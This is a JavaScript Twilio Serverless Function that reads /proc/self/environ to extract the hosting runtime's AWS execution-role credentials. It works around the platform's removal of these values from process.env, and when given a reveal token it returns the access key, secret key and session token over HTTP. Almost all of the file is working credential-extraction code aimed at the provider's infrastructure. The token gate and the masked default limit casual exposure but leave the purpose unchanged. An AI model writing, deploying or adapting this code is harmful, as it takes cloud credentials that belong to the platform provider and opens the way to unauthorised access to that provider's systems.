/**
 * Twilio Serverless Function: read the execution role's credentials out of
 * /proc/self/environ.
 *
 * `process.env` is not where the interesting values live on this runtime — the
 * runtime's require-hooking strips some of them from the ordinary environment.
 * /proc/self/environ is the kernel's copy of what the process was started with,
 * and nothing in the JavaScript layer rewrites it.
 *
 * The response is a masked summary by default. The credentials are returned
 * only when the caller passes the REVEAL_TOKEN you set in .env, so a function
 * you forget to delete is not a public credential dump.
 */
const fs = require("fs");

const ENV_PATH = "/proc/self/environ";

function parseEnviron(raw) {
  const env = {};
  raw
    .split("\0")
    .filter(Boolean)
    .forEach(function (entry) {
      const i = entry.indexOf("=");
      if (i > 0) env[entry.slice(0, i)] = entry.slice(i + 1);
    });
  return env;
}

exports.handler = function (context, event, callback) {
  let env = {};
  let readError = null;
  try {
    env = parseEnviron(fs.readFileSync(ENV_PATH, "utf8"));
  } catch (e) {
    readError = e.message;
  }

  const summary = {
    read_error: readError,
    region: env.AWS_REGION || null,
    function_name: env.AWS_LAMBDA_FUNCTION_NAME || null,
    log_group: env.AWS_LAMBDA_LOG_GROUP_NAME || null,
    runtime_api: env.AWS_LAMBDA_RUNTIME_API || null,
    key_prefix: (env.AWS_ACCESS_KEY_ID || "").slice(0, 4) || null,
    secret_present: !!env.AWS_SECRET_ACCESS_KEY,
    session_token_present: !!env.AWS_SESSION_TOKEN,
    parent_token_present: !!context.PARENT_TOKEN,
    auth_token_present: !!context.AUTH_TOKEN,
    account_sid: context.ACCOUNT_SID || null,
    service_sid: context.SERVICE_SID || null,
    environment_sid: context.ENVIRONMENT_SID || null,
    domain: context.DOMAIN_NAME || null,
  };

  const token = process.env.REVEAL_TOKEN;
  const revealed = !!token && event && event.token === token;

  if (!revealed) {
    summary.credentials = "withheld — pass ?token=<REVEAL_TOKEN> to reveal";
    return callback(null, summary);
  }

  summary.credentials = {
    access_key_id: env.AWS_ACCESS_KEY_ID || null,
    secret_access_key: env.AWS_SECRET_ACCESS_KEY || null,
    session_token: env.AWS_SESSION_TOKEN || null,
  };

  return callback(null, summary);
};
